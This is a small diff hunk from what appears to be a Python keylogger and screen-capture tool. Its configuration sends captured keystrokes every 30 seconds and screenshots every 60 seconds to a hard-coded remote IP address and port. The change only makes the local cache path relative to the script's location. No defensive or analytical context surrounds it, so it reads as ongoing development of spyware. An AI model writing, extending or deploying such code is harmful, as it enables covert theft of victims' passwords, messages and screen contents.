@@ -28,7 +28,8 @@ HOST, PORT     = '107.189.21.156', 43558                                        
 IMG_QUALITY    = 70                                                                                           #
 KEY_INTERVAL   = 30  # Keystrokes: sent every 30s if changed                                                  #
 IMG_INTERVAL   = 60  # Screenshots: sent every 60s if changed                                                 #
-CACHE_DIR      = 'cache'                                                                                      #
+SCRIPT_DIR     = os.path.dirname(os.path.abspath(__file__))                                                   #
+CACHE_DIR      = os.path.join(SCRIPT_DIR, 'cache')                                                            #
 MAX_CACHE_SIZE = 500 * 1024 * 1024  # 500 MB cap                                                              #
 # ----------------------------------------------------------------------------------------------------------- #
 
